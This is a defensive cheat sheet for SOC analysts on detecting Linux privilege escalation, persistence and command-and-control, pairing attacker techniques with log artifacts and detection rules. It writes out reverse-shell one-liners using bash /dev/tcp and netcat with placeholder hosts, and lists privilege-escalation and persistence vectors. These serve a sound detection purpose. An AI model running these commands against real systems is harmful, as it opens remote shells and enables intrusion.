# Linux Threat Detection: Privilege Escalation, Persistence & C2 Cheat Sheet

A technical reference guide covering late-stage post-exploitation activities in Linux environments, including **Privilege Escalation (TA0004)**, **Persistence (TA0003)**, and **Command and Control (TA0011)**.

---

## 1. Reverse Shells & C2 Connections

Attackers use native binaries or interpreters to spawn interactive outbound connections back to C2 infrastructure.

### Detection Indicators & Commands
| Mechanism / Tool | Execution Pattern | Auditd / Log Artifacts | Detection Rule |
| :--- | :--- | :--- | :--- |
| **Bash / Netcat Shells** | `bash -i >& /dev/tcp/IP/PORT 0>&1`<br>`nc -e /bin/bash IP PORT` | `auditd` (`EXECVE`), Sysmon for Linux | Process spawning with `/dev/tcp` or network sockets attached to `/bin/bash` |
| **Scripting Languages** | `python3 -c 'import socket...'`<br>`perl -e '...'` | `auditd` (`EXECVE`) | Interpreter processes spawning interactive subshells (`sh`, `bash`) |
| **Outbound Connections** | Network sockets established by non-standard processes | `ss -tpn`, `netstat -anp` | Non-network daemons initiating outbound traffic on non-standard ports |

---

## 2. Local Privilege Escalation (PrivEsc)

Exploiting misconfigurations, SUID binaries, or Sudo rights to elevate to `root`.

### Artifacts & High-Risk Activity
| Technique | Execution / Vector | Detection Focus |
| :--- | :--- | :--- |
| **Sudo Misuse** | `sudo -l`, execution of GTFOBins via `sudo` | `/var/log/auth.log` / `/var/log/secure` tracking `COMMAND=` entries |
| **SUID Exploitation** | Execution of binaries with setuid bit enabled (`chmod +u+s`) | `auditd` monitoring `execve` calls targeting known SUID paths or custom binaries |
| **Kernel Exploits** | Compilation or execution of local exploit code (`gcc exploit.c -o exploit`) | Tool execution in `/tmp` combined with sudden UID changes (`UID=0`) |

---

## 3. Linux Persistence Mechanisms

Maintaining unauthorized access across system reboots and account cleanups.

### Staging & Persistence Locations
| Vector | Persistence Location / Command | Log Artifact |
| :--- | :--- | :--- |
| **Cron Jobs** | `/etc/crontab`, `/etc/cron.*`, `/var/spool/cron/crontabs/` | `auditd` watching write access (`-p wa`) to cron paths |
| **Systemd Services** | Custom `.service` files in `/etc/systemd/system/` | `journalctl`, `auditd` monitoring systemd service creations |
| **SSH Keys** | Appending malicious keys to `~/.ssh/authorized_keys` | File creation/modification events in SSH configuration directories |
| **Shell Profiles** | Adding execution hooks to `/etc/profile`, `~/.bashrc`, `~/.bash_profile` | File modification logs for user startup scripts |

---

## SOC Analyst Notes

1. **GTFOBins Awareness:** Monitor `sudo` execution logs for dual-use utilities like `find`, `vim`, `nano`, `awk`, or `python` being run with elevated rights.
2. **Authorized Keys Changes:** Any modification to `~/.ssh/authorized_keys` for privileged users (`root`, administrative accounts) must trigger a high-priority investigation.
3. **Interactive Shells from Interpreters:** Treat any instance where a web server (`www-data`) or interpreter (`python`, `perl`, `php`) spawns a secondary `/bin/sh` or `/bin/bash` process as an active system breach.
